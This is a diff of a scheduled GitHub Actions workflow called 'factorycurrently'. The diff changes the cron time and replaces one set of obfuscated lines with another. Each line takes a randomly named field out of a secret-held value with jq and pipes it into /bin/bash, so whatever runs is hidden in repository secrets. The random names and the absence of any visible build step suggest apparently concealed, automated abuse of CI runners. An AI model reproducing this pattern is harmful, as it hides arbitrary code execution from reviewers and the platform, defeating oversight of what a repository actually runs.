@@ -3,36 +3,21 @@ name: factorycurrently
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
+    - cron: '25 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: factorycurrently
         env:
-          srgf6: ${{ secrets.srgf6 }}
+          e3: ${{ secrets.e3 }}
         run: |
-          echo $srgf6 | jq -r .jqzhf819 | /bin/bash
-          echo $rk9 | jq -r .cmysm9157 | /bin/bash
-          echo $eb5 | jq -r .ub19 | /bin/bash
-          echo $ailn08771 | jq -r .evf39 | /bin/bash
-          echo $ohokl9941 | jq -r .pal48752 | /bin/bash
-          echo $bd72368 | jq -r .alekj91 | /bin/bash
-          echo $y01 | jq -r .eanhj14 | /bin/bash
-          echo $mbwoy049 | jq -r .ah11 | /bin/bash
-          echo $voade9162 | jq -r .lj4 | /bin/bash
-          echo $ma28 | jq -r .g79 | /bin/bash
-          echo $ejc562 | jq -r .lt5 | /bin/bash
-          echo $rg21 | jq -r .iz07247 | /bin/bash
-          echo $lpg371 | jq -r .boso5 | /bin/bash
-          echo $x98523 | jq -r .j24 | /bin/bash
-          echo $f75 | jq -r .sbxiz932 | /bin/bash
-          echo $y60 | jq -r .flgne07 | /bin/bash
-          echo $rl72 | jq -r .whe5 | /bin/bash
-          echo $e171 | jq -r .qzx31134 | /bin/bash
-          echo $vf77320 | jq -r .l5801 | /bin/bash
-          echo $g4740 | jq -r .qm2 | /bin/bash
-          echo $lezyl3791 | jq -r .ppu9738 | /bin/bash
+          echo $e3 | jq -r .eu76641 | /bin/bash
+          echo $d4 | jq -r .va57798 | /bin/bash
+          echo $tvbc5 | jq -r .nf7380 | /bin/bash
+          echo $fax3612 | jq -r .y8748 | /bin/bash
+          echo $lr0945 | jq -r .ndjzi8 | /bin/bash
+          echo $pn0366 | jq -r .fhyo0462 | /bin/bash
+          echo $iileh3526 | jq -r .hixon664 | /bin/bash
 
